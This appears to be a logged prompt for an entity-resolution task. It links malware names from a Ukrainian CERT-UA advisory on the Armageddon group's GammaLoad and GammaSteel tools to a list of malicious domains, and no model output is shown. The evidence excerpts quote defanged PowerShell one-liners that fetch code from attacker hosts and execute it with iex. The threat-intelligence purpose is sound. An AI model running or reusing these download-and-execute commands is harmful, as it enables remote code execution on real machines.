=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
E3. z.ps1
E4. GammaLoad.PS1_v2
E5. stage1.ps1
E6. GraphSteel
E7. stage2.ps1
E8. WS_FTP
E9. OUTSTEEL
E10. TRYxaEbX_2.ps1
E11. .NET Framework
E12. Internet Explorer
E13. Ngrok
E14. MarsStealer
E15. GrimPlant
E16. Foxmail
E17. FTPGetter
E18. JesterStealer
E19. Hashcat
E20. Mozilla
E21. needrestart
E22. Meterpreter
E23. DarkCrystal RAT
E24. PowerShell [aka powershell.exe]
E25. 223329.exe
E26. POWERGAP
E27. wscript.exe
E28. 62ea.exe
E29. SPECTR.Shell
E30. 966449.exe
E31. MS PowerPoint
E32. GammaSteel.NET
E33. HarvesterX
E34. PowerShell (powershell.exe)
E35. GammaSteel.PS1
E36. fishitor.ru
E37. acteran.ru
E38. bilitora.ru
E39. erwini.ru
E40. apoxipodes.ru
E41. emterox.ru
E42. tiloraso.ru
E43. tortunas.ru
E44. billyhot.ru
E45. kopratiso.ru
E46. dodortar.ru
E47. candidar.ru
E48. lnk-upload.dodortar.ru
E49. mulleti.ru
E50. dod-upload.dodortar.ru
E51. motocheck.in
E52. stormpredictor.host
E53. ryomy.ru
E54. circulas.ru
E55. meteolink.host
E56. successilin.top
E57. omyce.ru
E58. bul-opros.top
E59. baidencult.com
E60. iol.pt
E61. toknowall.com
E62. gopoppers.com
E63. podologaneri.it
E64. districoperav.icu
E65. potrakit.ru
E66. giraffe-tour.ru
E67. rivierafamily.com
E68. nitikora.ru
E69. tridiuma.ru
E70. parodadoca.ru
E71. yandex.ru
E72. varanasiclick.ru
E73. olei.ro
E74. www.msftncsi.com
E75. jevejosader.top
E76. enlamentedeunasesor.com
E77. milotrad.ru
E78. milotraf.ru
E79. s8.h.mchost.ru
E80. lingrevelat.com
E81. aspe.ro
E82. pastebin.com
E83. leonardis.ru
E84. jokotras.ru
E85. afi-opros.top
E86. nikotod.ru
E87. mitraseo.hol.es
E88. marmaris.com.ua
E89. xsph.ru
E90. nx0.ru
E91. ncscc.gov.ua
E92. staystrongjewels.com
E93. wi-opros.top
E94. xcasinobonuses.net
E95. helpzzfound.site
E96. servebeer.com
E97. evil.server.com
E98. 3utilities.com
E99. whoer.net
E100. agreminj.com
E101. cloudflare-dns.com
E102. airmauritiusticket.com
E103. dyndns.com
E104. ns.ns2-dns.com
E105. bounceme.net
E106. ddns.net
E107. ns2-dns.com
E108. plexbd.net
E109. sytes.net
E110. brunoboys.net
E111. netbin.host
E112. viewdns.net
E113. dcshost.net
E114. gov-ua.info
E115. ns.ns3-dns.com
E116. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E117. ns3-dns.com
E118. freedynamicdns.org
E119. www.facebook.com
E120. golgba.com
E121. www.michiganmastereltiempo.com
E122. www.symantec.com
E123. chinagrill.co
E124. atlantar.ru
E125. motoristo.ru
E126. moolin.ru
E127. bubenci.ru
E128. callsol.ru
E129. clipperso.ru
E130. cooperi.ru
E131. detroito.ru
E132. farafauler.ru
E133. flayga.ru
E134. ganara.ru
E135. hawksi.ru
E136. hofsteder.ru
E137. kilitro.ru
E138. kurapat.ru
E139. lnasfe.ru
E140. lopasts.ru
E141. mafirti.ru
E142. metanat.ru
E143. mitlubald.ru
E144. paparat.ru
E145. pasamart.ru
E146. qkcew.ru
E147. rncsq.ru
E148. tarlit.ru
E149. tbwelo.ru
E150. wicksl.ru
E151. xcqef.ru
E152. nxkad.ru
E153. dnslookup.seowebchecker.com
E154. tools.nexcess.net
E155. viewdns.info
E156. www.portcheckers.com
E157. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.NET" (Software) — options: E6, E11, E1, E12 — ctx: S1
M3. "HarvesterX" (Software) — options: E16, E17, E18, E12 — ctx: S1
